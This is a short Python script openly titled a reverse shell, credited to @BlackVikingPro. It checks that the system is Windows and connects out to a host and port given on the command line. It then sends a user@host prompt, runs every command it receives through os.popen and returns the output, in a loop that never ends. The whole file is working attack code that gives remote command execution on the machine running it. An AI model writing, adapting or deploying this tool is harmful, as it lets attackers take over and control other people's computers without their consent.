#!/usr/bin/env python
""" Reverse Shell Script -- By: @BlackVikingPro """
""" Current Version: v1.0 """

import socket, sys, os, getpass, platform, signal
from os import urandom
import base64

if platform.system() == "Linux": # Linux
	print "Sorry, Linux is not currently supported."
	sys.exit()
elif platform.system() == "Darwin": # Mac OS X
	print "Sorry, Mac is not currently supported."
	sys.exit()
elif platform.system() == "Windows":
	pass # continue

def signal_handler(signal, frame):
	print ( 'Caught ( ^C )' )
	sys.exit(0)
	pass

# watch for ^C
signal.signal(signal.SIGINT, signal_handler)

def isset(var):
	if var != "":
		return True
	elif var == "":
		return False
		pass

def execcmd(command, socket):
	try:
		# os.system(command)
		output = os.popen(command).read()
		socket.send(b'%s' % output.encode())
		# print ( "Command %s executed." ) % command
		return True
		pass
	except:
		socket.send(b"Command '%s' failed." % command.encode() )
		# print ( e )
		return False
	pass


# connect to server/port to listen for all TCP data
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	server = (str(sys.argv[1]), int(sys.argv[2]))
	pass
except IndexError as e:
	if sys.argv[0].startswith('./'):
		print ( "Usage: %s <server hostname/ip> <port>" % sys.argv[0] )
		exit()
	else:
		print ( "Usage ./%s <server hostname/ip> <port>" % sys.argv[0] )
		exit()
		pass

socket.connect(server)

# to personalize the shell
username = getpass.getuser()
hostname = platform.node()
cwd = os.getcwd()

try:
	if os.getuid() == 0:
		hashbang = '#'
	else:
		hashbang = '$'
	pass
except AttributeError as e:
	hashbang = '>'
	pass
shell = username + "@" + hostname + ":" + cwd + " " + hashbang + " "

try:
	while True: # keep connection alive forever
		socket.send(b'%s' % shell.encode())
		data = socket.recv(1028) # modify to limit max byte length
		command = data.decode('utf-8')
		try:
			execcmd(command, socket)
			pass
		except:
			socket.send(b'command didn\'t execute.\n')
			pass
	pass
except:
	socket.close()
	print ( "Connection Closed." )
	pass